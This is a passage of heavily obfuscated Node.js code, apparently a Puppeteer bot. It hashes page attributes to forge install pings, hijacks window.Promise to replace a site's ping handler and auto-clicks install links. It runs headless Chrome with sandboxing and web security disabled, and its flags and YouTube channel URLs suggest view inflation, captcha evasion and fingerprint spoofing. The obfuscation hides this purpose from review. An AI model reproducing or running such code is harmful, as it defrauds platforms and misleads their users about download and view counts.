0x12b + 0x10f * 0xf] |= (-0x98f + 0x1 * 0x1e3d + -0x2d2 * 0x7 | L >> 0x1 * 0x1e4b + 0x1 * -0x1829 + 0x308 * -0x2) << y[-0x19 * -0x3 + -0x207d + -0x61 * -0x55 & N++], P[N >> 0x5 * 0x335 + 0x356 + -0x135d] |= (0x30e * -0x2 + -0x1 * 0x12ef + -0xd * -0x1f7 | L >> 0x143 + -0xc50 + 0xb19 & 0xa24 + 0xa99 + 0x2b * -0x7a) << y[-0x2699 + 0xcf7 * -0x1 + 0x3393 & N++], P[N >> -0xa98 + -0x987 + 0x1421] |= (0x11e7 + -0xac1 * -0x3 + -0x31aa | L >> -0x2431 + -0x25f1 + -0x1c * -0x2a6 & 0x1ffa + -0x1 * -0x1965 + -0x3920) << y[-0x107 * -0x13 + -0x21c0 + 0xe3e & N++], P[N >> -0xa70 + -0x1a6f + -0x419 * -0x9] |= (0xac2 + 0xa7 * -0x7 + -0x5b1 | -0x26f1 + 0x6b * -0x1d + 0x5 * 0xa43 & L) << y[-0x1 * -0xd4 + -0x734 + 0x1 * 0x663 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x23d3 + 0x617 * 0x4 + -0x3bef ? (this['block'] = P[-0x2158 + -0x798 + 0x2900], this['start'] = N - (0x1d * 0xa7 + -0x523 * -0x2 + -0x1cf1), this['hash'](), this['hashed'] = -0xc2 + -0x256d + 0x98c * 0x4) : this['start'] = N;
                }
                return this['bytes'] > -0x60bdee4 + 0x1bb935903 + -0x410 * 0x2caf22 && (this['hBytes'] += this['bytes'] / (-0x1e0 * -0x3fcd72 + -0x1a6355168 + 0x45d28375 * 0x8) << -0x1f0a + 0x1 * -0x251 + -0x215b * -0x1, this['bytes'] = this['bytes'] % (-0x19a9305c + 0x1 * 0xb2ef713c + 0x66b9bf20)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0xd81 + -0x17 * 0x14d + 0x106b;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x93 * 0xb + 0x67d * -0x1 + -0xa * -0x6] = this['block'], J[K >> 0x80b * 0x2 + -0x1c22 + 0x1 * 0xc0e] |= x[0xb10 + -0x2b9 * 0x8 + 0x1 * 0xabb & K], this['block'] = J[-0x1176 * 0x1 + -0x1 * 0x1dff + 0x5 * 0x981], K >= -0x1 * -0x25fb + 0x1256 * -0x1 + -0x136d && (this['hashed'] || this['hash'](), J[0x11 * -0xa5 + 0x24a4 + -0x19af] = this['block'], J[0x3 * 0xb9c + -0x8ba + 0x21 * -0xca] = J[0x266b + -0x2 * -0x969 + 0x3 * -0x1314] = J[-0x842 + 0x3 * 0x1b7 + 0x2f * 0x11] = J[0xaed + -0x5f * 0x49 + 0x102d] = J[-0xd0f + 0x2 * -0x3fa + 0x1507] = J[0x2122 + 0x25fc + -0x17b3 * 0x3] = J[-0x1cc6 + 0x2 * 0xf3 + 0x1ae6] = J[-0x1c31 + -0x49 * -0x86 + -0x9fe] = J[-0x1f * 0x3d + -0xe4b + 0x15b6 * 0x1] = J[0x21 * 0x7 + -0x5d * 0x25 + 0xc93] = J[0x2093 + 0xd73 * 0x1 + -0x2dfc] = J[0x23b1 + 0x4a2 + -0x2848] = J[-0x2172 + -0x1 * 0x171d + 0x389b] = J[0x1688 + -0x1d16 + -0x1 * -0x69b] = J[0x2 * 0x6c5 + 0x5e1 * 0x1 + 0x1 * -0x135d] = J[-0x1d44 + 0x1 * 0xf51 + 0x1 * 0xe02] = 0x5d * -0xb + -0x455 + 0x854), J[-0xb * -0x26b + -0x1d8d + -0x16 * -0x23] = this['hBytes'] << 0x5 * -0x4d9 + 0x4 * 0x59f + 0x1c4 | this['bytes'] >>> -0x1bca + 0x11 * 0xd3 + 0x7 * 0x1fc, J[-0xad * -0x1 + 0xcc * -0x2a + 0xa * 0x349] = this['bytes'] << 0x1 * -0x10c4 + -0x21 * 0x41 + -0x118 * -0x17, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x3 * 0x323 + 0x1414 + -0xf * 0xb5; J < 0x774 + 0x1f17 + -0x263b; ++J)
                K = Q[J - (-0x596 + -0x252a * 0x1 + -0x10b * -0x29)] ^ Q[J - (-0x26f7 + 0xd * -0x26f + 0x46a2)] ^ Q[J - (0x1 * -0x20ab + 0xc * -0x1c0 + 0x35b9)] ^ Q[J - (0x12ad + -0x47 * 0x89 + 0x676 * 0x3)], Q[J] = K << 0x1 * -0xb23 + 0x1 * -0xea9 + -0x529 * -0x5 | K >>> -0x9 * -0x24b + 0x5b3 * -0x1 + 0xed1 * -0x1;
              for (J = -0xc4 + 0x2124 + -0x94 * 0x38; J < -0x329 * -0x4 + 0x169c + -0x8cb * 0x4; J += 0xa94 + 0xf * -0x16 + -0x153 * 0x7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1643 * -0x1 + -0x2353 + 0xd15 | L >>> 0x1f5d + -0x1 * 0x94a + -0x15f8) + (M & N | ~M & O) + P + (-0x1 * 0x8cb26337 + 0x6e512e * 0xe1 + 0x863f8362) + Q[J] << 0xbc9 * 0x1 + 0xf05 + -0x1 * 0x1ace) << -0x5f * -0x49 + 0x12da + -0x16f6 * 0x2 | P >>> 0x189b * 0x1 + -0x1be9 + 0x369) + (L & (M = M << -0x197 + 0x186c + -0x16b7 | M >>> -0x26b * -0x5 + -0x10ab + 0x496) | ~L & N) + O + (-0x78722c9d + -0x5ba3373 * 0x3 + 0xe423408f) + Q[J + (-0x1b49 + -0x35 * 0x26 + -0xbb8 * -0x3)] << -0xa89 + 0xa0d * 0x2 + 0x991 * -0x1) << -0xb7 * 0x2b + -0x2407 + 0x29 * 0x1a1 | O >>> -0x1fa * 0x9 + -0x1ca * 0x6 + 0x98b * 0x3) + (P & (L = L << 0x1b77 * -0x1 + -0x295 * -0x7 + 0x982 | L >>> -0xdce + -0x1549 + -0x705 * -0x5) | ~P & M) + N + (0x8a2c1f * 0xe0 + 0x245c2e05 * -0x3 + 0x4eb06888) + Q[J + (0x2697 + -0x124e + 0x1 * -0x1447)] << -0x202c + 0xd08 + 0x1324) << -0x2513 + -0x1 * 0xe13 + 0x332b | N >>> -0x20e5 + -0x1 * -0xbe6 + 0x92 * 0x25) + (O & (P = P << 0x1 * 0x26dd + -0xe * -0xb8 + -0x30cf | P >>> -0x1139 * 0x2 + -0x3 * -0x905 + 0x765) | ~O & L) + M + (-0x17a2fe * -0x104 + 0x95 * 0x54f20f + 0x11100ce6) + Q[J + (0x94d * -0x2 + 0x6 * 0x67f + 0xd * -0x191)] << 0x192e + 0xb * 0x2b6 + -0x3700) << 0x567 + 0x1 * -0xe98 + 0x936 | M >>> -0xf37 + -0x22bb + 0x320d) + (N & (O = O << -0xb * -0x79 + -0x17a8 + -0x5 * -0x3b7 | O >>> 0x6d5 + -0x362 + -0x371) | ~N & P) + L + (-0x56355b8 * -0x1b + -0x1 * 0x2994d126 + -0x3 * 0x4763fe3) + Q[J + (0x1ec5 + -0x241 * 0x1 + -0x1c80)] << -0xbf9 * 0x1 + 0x2453 + -0x185a, N = N << 0x23f6 * 0x1 + -0x397 + -0x2041 | N >>> 0x20e4 + 0x6f5 * 0x4 + -0x3cb6;
              for (; J < 0x1489 + -0x7 * 0x209 + -0xa * 0x9d; J += 0x1 * 0xe53 + 0x1807 + -0x3 * 0xcc7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x8 * -0x3d6 + -0x4 * 0x4c1 + 0x31b9 | L >>> 0x18f6 + -0x9b2 + -0x1 * 0xf29) + (M ^ N ^ O) + P + (-0x1 * 0x14e3363e + -0x57358e03 + 0xdaf2afe2) + Q[J] << -0x1d63 + 0x20cd + 0x26 * -0x17) << 0x34f * -0x7 + 0x20f4 + -0x9c6 | P >>> -0x1 * 0x1e90 + 0x16fa + 0x7b1) + (L ^ (M = M << -0x2 * -0x5ef + 0x7d + 0xf1 * -0xd | M >>> -0x721 * -0x2 + 0x969 + -0x17a9) ^ N) + O + (0x2bf6c6b + 0xdf44e35 * -0xc + 0x75 * 0x25aecaa) + Q[J + (-0x13eb + -0x5 * -0x56c + 0xb8 * -0xa)] << 0xaf3 * 0x2 + 0x766 + 0x5dc * -0x5) << 0x1cdb + 0x1696 + -0x336c * 0x1 | O >>> -0x1dd1 * -0x1 + -0xebe + -0xef8) + (P ^ (L = L << 0x119a * 0x2 + -0x7 * 0x2 + -0x2308 | L >>> 0x270b + 0x70f * 0x1 + -0x2e18) ^ M) + N + (0x83 * 0x77d3ca + 0x3436418c + -0x3b * 0xb9f4b) + Q[J + (-0x1 * 0xfbb + -0x13d1 + 0x238e)] << 0x5bf * -0x1 + -0x89 * -0xf + -0x1 * 0x248) << -0x1 * -0xad + -0x5b * 0x31 + -0x7 * -0x265 | N >>> -0x573 + 0x4f5 * 0x2 + 0x1f * -0x24) + (O ^ (P = P << -0x3b * -0xc + 0x1 * 0x56f + -0x1 * 0x815 | P >>> 0xe33 + 0xa * -0x230 + 0x7af) ^ L) + M + (-0xae9f1975 + -0x8ff76b80 + 0x1ad707096) + Q[J + (0x971 * -0x4 + 0xbf + 0x1 * 0x2508)] << -0xcf * -0x24 + 0x1c4 * 0x10 + -0x1cae * 0x2) << -0x21ec + -0x3 * -0x89e + -0x13 * -0x6d | M >>> -0x205 * -0xf + 0x6 * -0x5fd + 0x5be) + (N ^ (O = O << -0x1a69 + -0x59 * -0x18 + -0x3a3 * -0x5 | O >>> -0x1c23 + 0x373 * 0x2 + 0x153f) ^ P) + L + (0xa44eab98 + 0xd0fa8bc6 + -0x1066f4bbd) + Q[J + (-0x1 * 0x1389 + -0x1fa3 + 0x3330)] << 0x1a * -0xf3 + 0x8b * -0x18 + -0xc92 * -0x3, N = N << 0x17f9 + 0x1b7 + -0x1992 | N >>> 0x1472 + 0x1d55 + -0x31c5;
              for (; J < -0xb * 0x1ac + -0x1395 + -0x1 * -0x2635; J += 0x323 + -0x1 * 0xc5 + 0x1 * -0x259)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1cf * 0x2 + 0x1c71 + 0x557 * -0x6 | L >>> 0x19ee + 0x1 * -0x124d + -0xd6 * 0x9) + (M & N | M & O | N & O) + P - (0x56e97a57 + -0x62b785a6 + 0x4b * 0x1a9a179) + Q[J] << 0x135f + 0x1aab + -0x47 * 0xa6) << -0x2e * -0xcb + -0x36f + -0x2106 | P >>> 0x1 * 0x18df + -0xa * -0x8 + -0x504 * 0x5) + (L & (M = M << 0x14b1 + 0xefd * 0x1 + -0x2390 | M >>> -0x11e2 + 0x48b * -0x1 + 0x166f) | L & N | M & N) + O - (0x33cab5e + 0xb * -0x1481c781 + 0x14f3b2a51) + Q[J + (0x1 * -0x1682 + -0x25ee + 0x3c71)] << 0x1 * 0x805 + -0x55 * 0x74 + 0x1e7f) << -0x19e * 0x2 + 0x14f4 + -0x17 * 0xc5 | O >>> 0x8b3 + -0x735 + -0x47 * 0x5) + (P & (L = L << -0x113 * -0x1c + -0xdf * -0x26 + -0x10 * 0x3f1 | L >>> 0x29 * -0x29 + -0x7 * 0xf + 0x254 * 0x3) | P & M | L & M) + N - (-0x28379889 + -0x57b708dd * -0x1 + -0x4164d2d0 * -0x1) + Q[J + (-0x264c + 0x2 * -0xfbd + 0x8 * 0x8b9)] << -0xd26 + -0x1 * 0x1dfd + 0x2b23) << 0x2 * -0xab5 + 0x135d * 0x1 + 0x6a * 0x5 | N >>> -0x24e1 + 0x1 * -0x803 + 0x2cff) + (O & (P = P << 0x1477 + -0x1bd0 + 0x777 | P >>> 0x17e3 + 0x14da + -0x15b * 0x21) | O & L | P & L) + M - (-0x2 * -0x1fbf9341 + -0x1 * -0xc7cdd79f + 0x344fd * -0x2e01) + Q[J + (-0x900 + -0x25c4 + 0x95b * 0x5)] << -0x199c + 0xcb3 * -0x1 + -0x1d3 * -0x15) << 0x1ca9 * 0x1 + 0x1 * 0x15b7 + -0x325b | M >>> 0x1 * -0x1ab1 + 0x30 * -0x86 + 0x33ec) + (N & (O = O << 0x2b * 0x76 + 0x1091 * -0x2 + 0x3 * 0x47a | O >>> -0x377 * -0x1 + -0x83 * -0x10 + -0xba5) | N & P | O & P) + L - (-0x13 * -0xad61096 + 0x1 * 0x8903cb12 + -0xe602c310) + Q[J + (-0x17 * 0x153 + -0x2023 + 0x3e9c)] << 0x29 * -0x41 + -0x1d44 + 0x27ad, N = N << 0x180e + -0xfc8 + -0x15c * 0x6 | N >>> -0xb * -0x33f + 0x2006 + -0x1693 * 0x3;
              for (; J < -0xcbf + 0x2185 * -0x1 + 0x2e94; J += -0x1d * -0x79 + 0x3b0 * -0x8 + 0xfd0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x3 * -0x193 + -0x1304 + 0x728 * 0x2 | L >>> 0x142b + -0x241 * 0x5 + 0x1 * -0x8cb) + (M ^ N ^ O) + P - (-0x24f4 * 0x3624 + 0x9 * 0x70409a4 + -0x1b66e4a) + Q[J] << 0x103 * -0x11 + 0x26af + -0x157c) << 0xa * -0x35e + -0x1dd * -0xc + 0x3c7 * 0x3 | P >>> 0x1 * -0xc5f + 0x310 * 0x8 + 0x603 * -0x2) + (L ^ (M = M << -0x1 * 0x53b + -0x13cd * 0x1 + -0x3 * -0x862 | M >>> -0x1c6e + 0xfde * -0x2 + -0x3c2c * -0x1) ^ N) + O - (0xc52d902 * 0x6 + 0x1 * 0x4bbf3269 + 0x5 * -0x1337020f) + Q[J + (0x2242 + -0x15ec + -0xc55)] << -0x1d40 + -0x24a4 + 0x41e4) << 0x17 * 0x137 + -0x1ca + 0xa * -0x29d | O >>> -0x22b1 + -0x62a * -0x5 + 0x1 * 0x3fa) + (P ^ (L = L << -0x10c1 + 0x77f + 0xa * 0xf0 | L >>> -0x641 + 0x963 + -0x320) ^ M) + N - (0x1 * 0x1f66e0b4 + 0x1d44f361 * -0x3 + 0x6e053799) + Q[J + (-0xb + 0x1 * -0x4a1 + 0x4ae)] << -0x5 * -0x637 + -0xae * -0x2c + -0x3cfb) << -0xacf + -0x8d * 0x2f + 0xd * 0x2d3 | N >>> -0x281 + -0x25df + 0x287b) + (O ^ (P = P << 0xb7f + 0x1 * 0x208b + 0xea4 * -0x3 | P >>> -0x1 * 0x1182 + 0x1146 + 0x3e) ^ L) + M - (0x11ca990e + -0x196aa09 * 0x1 + -0xf9 * -0x26768d) + Q[J + (-0x202 * -0x13 + -0x6 * 0x4d6 + -0x91f * 0x1)] << -0x2416 + 0x1a40 + 0x4eb * 0x2) << 0x2b8 * -0xc + -0x14c6 + 0x356b | M >>> -0x115f + 0x13ff * -0x1 + 0x2579) + (N ^ (O = O << 0x1eb5 + 0x28f + -0x2126 | O >>> -0x1 * 0x261d + 0x2302 * -0x1 + -0x1 * -0x4921) ^ P) + L - (-0x1 * -0x22a55102 + -0xd73ed0d + 0x1b4d597 * 0x13) + Q[J + (0xb02 + -0x61 * -0x60 + -0x2f5e)] << -0x2 * 0x111a + -0x184f * -0x1 + 0x9e5, N = N << 0x1 * 0x2381 + 0x528 + -0x288b * 0x1 | N >>> -0x22 * 0x115 + -0x5 * -0x1b7 + 0x1c39;
              this['h0'] = this['h0'] + L << 0x3aa * 0x7 + 0x15e2 + -0xd * 0x3a8, this['h1'] = this['h1'] + M << -0x1 * 0x1e95 + 0x1 * 0xe3e + 0x1057, this['h2'] = this['h2'] + N << -0x15ce + -0x1 * -0x24df + 0xcb * -0x13, this['h3'] = this['h3'] + O << -0x3 * 0x35d + -0xa15 + 0x142c, this['h4'] = this['h4'] + P << -0x4 * 0x23 + -0x1aa2 + 0x1b2e;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1f5f + -0x4d5 + 0x1 * -0x1a6e & 0x1241 + 0x10ad + -0x22df] + w[J >> -0x1 * -0x9ba + 0xa13 + -0x13b5 & -0x1 * -0xb29 + -0xe3c + -0x322 * -0x1] + w[J >> 0x1 * -0x649 + -0x446 * -0x1 + 0x217 & 0x2119 + -0x7b9 + -0x1951] + w[J >> 0x1b * -0x155 + -0x2408 + -0x58b * -0xd & -0x20e9 + 0x7d8 + -0x20 * -0xc9] + w[J >> 0xe2 + -0x1203 + 0x112d & -0x26a5 + -0x87d + 0x2f31] + w[J >> 0x13 * 0x167 + -0x29 * -0x2e + -0x21fb & 0x25b3 + 0x7 * -0x208 + -0x5db * 0x4] + w[J >> -0x55 * -0x14 + 0xf4 + -0x794 & -0x23cc * -0x1 + -0x1328 + -0x1095] + w[-0x26ad + -0x7d + 0x3 * 0xd13 & J] + w[K >> 0x22c1 * -0x1 + 0x263e + -0x361 & -0x1 * 0x23cf + -0x25 * 0x1b + 0x27c5] + w[K >> 0x185f + 0x5c + -0x173 * 0x11 & -0x11 * 0xb + -0xdcf + 0x25 * 0x65] + w[K >> 0xe * 0x1d3 + -0x188e + -0x74 * 0x2 & 0x37 * -0x1 + 0x509 + 0x1 * -0x4c3] + w[K >> 0x2697 + 0x3f0 + -0x1 * 0x2a77 & 0x2055 + 0x1 * 0x1ea7 + -0x3eed] + w[K >> 0x11ad + -0x23c8 + 0x1227 & 0x149b + -0x4 * -0x810 + -0x1 * 0x34cc] + w[K >> -0xcdc + -0x254b + 0x322f & 0x4 * -0xe3 + 0x14c2 + -0x1 * 0x1127] + w[K >> -0x179b * 0x1 + -0x825 + 0x26 * 0xd6 & -0x59 * -0x9 + -0xda * 0x11 + -0x5b4 * -0x2] + w[-0xf3 + -0x759 + 0x17 * 0x5d & K] + w[L >> 0x2 * 0x982 + 0x3 * 0x42f + -0x1f75 & -0xfc3 + -0x134a + 0x231c] + w[L >> -0x5 * 0x22d + -0x1f * 0x89 + 0x38 * 0x7e & -0x2 * 0x971 + 0x3e5 * -0x7 + 0x2e34] + w[L >> 0x623 + 0x3d * -0x31 + 0x2cf * 0x2 & 0x187f + -0x185a + -0x16 * 0x1] + w[L >> -0x1e45 + 0x1f79 + -0x124 & 0x37c * 0x7 + -0xe15 + 0x20 * -0x52] + w[L >> 0x1528 + 0x11 * -0xfb + -0x471 & -0xd * 0x1d9 + 0x8 * -0x29f + -0x3c1 * -0xc] + w[L >> 0x1476 + -0x6 * -0x20d + -0x20bc & -0x1 + 0xf29 * -0x2 + 0x1e62] + w[L >> -0x1ae5 + -0x17ba + 0x32a3 & 0x10 * -0x1ee + -0x275 * -0x9 + 0x2 * 0x469] + w[-0x1884 + -0xa64 + 0x22f7 & L] + w[M >> 0xd * -0x19f + -0x14de + -0x1 * -0x2a0d & 0x9b2 + 0x2 * 0x1187 + -0x2cb1] + w[M >> -0x83e + -0x486 * 0x3 + 0x8 * 0x2bd & -0x1 * 0x249b + -0xb * -0x38b + 0x24f * -0x1] + w[M >> -0x2 * 0x374 + 0x2ad + 0x44f * 0x1 & 0x116c + 0x1899 + -0x29f6] + w[M >> 0x745 * 0x2 + -0xc1 * 0x22 + 0x33 * 0x38 & 0x586 + -0x1 * -0x157e + -0x1af5] + w[M >> 0x13a + 0x157f + 0x489 * -0x5 & 0x3 * 0x87f + -0x81 + -0x9 * 0x2c5] + w[M >> -0x20e3 * -0x1 + -0x4 * -0x2a9 + -0x2b7f & 0x23c6 + 0x791 + -0x5 * 0x8a8] + w[M >> 0x893 + -0xb3 * -0x35 + -0x2d9e & 0x6f1 * -0x1 + 0x1de8 + -0x4 * 0x5ba] + w[-0xba * 0x24 + -0x4 * -0x831 + -0x27 * 0x2b & M] + w[N >> -0x15e6 * 0x1 + 0x2597 * -0x1 + 0x3b99 & -0x117f * -0x2 + -0x102e + -0x12c1] + w[N >> 0x17b * 0x1a + -0x26c4 + -0x5e * -0x1 & 0xf33 + 0x1 * -0xffb + 0xd7] + w[N >> 0x1e7a + -0x1 * -0x155 + -0x1fbb * 0x1 & -0x1 * -0x26ad + -0x1 * -0x301 + -0x299f * 0x1] + w[N >> -0x9e3 + 0x1747 + -0xd54 & -0xf * -0xed + -0xa39 * 0x1 + -0x47 * 0xd] + w[N >> 0x13be + -0x1608 + 0x256 & -0x1e14 + -0x9 * -0xef + 0x15bc] + w[N >> 0x1f42 + -0x26b * -0x8 + -0x2 * 0x1949 & 0x287 * -0xf + 0x1 * 0x267 + 0x2391] + w[N >> -0x3a3 * 0x1 + -0xcf7 * -0x2 + 0x76d * -0x3 & 0xcd6 + 0x53 * -0x39 + 0x5b4] + w[0x667 + 0x26b + 0x8c3 * -0x1 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x6a3 + -0x109e + 0x8b * 0x2b & -0x2e9 + -0x1a6 * -0xb + -0xe3a,
                J >> -0x504 + -0x67 * -0x1a + -0x562 & -0xfe + 0x2 * -0x260 + 0x6bd,
                J >> -0x2ad * -0x3 + -0x8cb * -0x3 + -0x2260 & 0x2131 + 0x1922 + -0x3954,
                -0x4ef * -0x3 + 0x3 * -0x1d4 + -0x1aa * 0x5 & J,
                K >> 0x8e2 * 0x3 + 0x6 * -0x629 + -0x14d * -0x8 & -0x16e5 + 0x631 + 0x11b3,
                K >> 0x620 + 0xf7c + -0x158c & -0x2431 + -0x23d9 + -0x7 * -0xa6f,
                K >> -0x1 * 0x14de + 0x133 * 0xd + 0x54f & -0x8 * -0x2a7 + 0x29 * 0xf + 0x2 * -0xb50,
                0x161 * -0x7 + -0x1353 + 0x1df9 & K,
                L >> -0x1b91 + 0xf54 + -0x1c3 * -0x7 & -0x162f + -0x8ba + 0x1fe8,
                L >> -0x734 * -0x1 + -0x7c1 + -0x1 * -0x9d & 0x1 * 0x1038 + 0x23c0 + -0x32f9,
                L >> -0x1289 * -0x1 + 0x2c4 + 0xa5 * -0x21 & 0x11 * 0x5c + -0x1 * 0x24cb + 0x1fae,
                -0x128a + -0x1cc8 + 0x3051 & L,
                M >> -0x1e1d + 0x2b * -0xc1 + 0x3ea0 & -0x1699 + 0x2 * -0x4f8 + 0x2188,
                M >> 0x2b5 + 0x754 + -0x9f9 & -0x1b * -0xba + -0x24e0 + -0x1 * -0x1241,
                M >> -0xd * -0x23b + -0xac * -0x9 + -0x2303 & 0x20 * -0xbf + 0x15 * -0x16 + 0x1aad,
                -0x228c + 0x83e + -0x1 * -0x1b4d & M,
                N >> 0x26b6 + -0x9d * -0x3a + -0x4a30 * 0x1 & -0x1e73 + 0x183b + 0x737,
                N >> 0x1e3e + 0x22aa + 0x19f * -0x28 & -0xae1 + -0x6 * 0x14c + 0x13a8,
                N >> -0x1f69 + -0x15df + 0x3550 & 0x2345 + -0x7aa + -0x1a9c,
                0x21d * 0x4 + 0x1 * -0x18c7 + 0x1152 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x10d1 + 0x4 * 0x618 + 0x77b * -0x1), (K = new DataView(J))['setUint32'](-0x996 + 0xa71 + -0xdb * 0x1, this['h0']), K['setUint32'](0x1061 + -0x9a4 + -0x6b9, this['h1']), K['setUint32'](-0x8e1 * 0x4 + -0x1720 + 0x2 * 0x1d56, this['h2']), K['setUint32'](-0x111b + 0x26b * 0xb + -0x1f * 0x4e, this['h3']), K['setUint32'](-0x10be + -0x8 * -0xe9 + 0x4c3 * 0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * 0x1863 + -0x2035 + 0x7d2];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x13 * -0x18a + -0x19dc + -0x362 * 0x1;
            J[0x16ab + -0xcd8 * 0x3 + 0xfdd]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xdd2 + 0x10 * -0x1ca + 0x2a72] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1971 + -0xe14 + 0x13c3 * 0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2 * -0x1032 + 0x7f1 * -0x1 + 0x3 * 0xd72;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x14be + 0x135d + -0x223f), Promise['resolve'](0x19cd * 0x1 + 0xa7 + 0x3d * -0x6f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x3 * -0xb79 + 0x1e52 + -0x1 * 0x40bd; j < 0x12d6 + -0x26fb + -0x1426 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x103 * 0x23 + -0x185d + -0x1 * -0x5b06 + (-0x1662 + -0xb75 * 0x3 + 0x4479) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xe * 0x16d + -0x1 * -0xf7b + 0x47e) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + Z(0x1, 'Xfc[') + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + a0(0x3) + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x517 * 0x5 + 0xe43 + 0xb30);
    let h = e[f];
    return h;
  }, d(b, c);
}
((() => {
  const a1 = b;
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2f * 0x95 + -0x1247 * -0x1 + 0x2 * -0x16d1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array[a1(0x5, '^w21')]['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
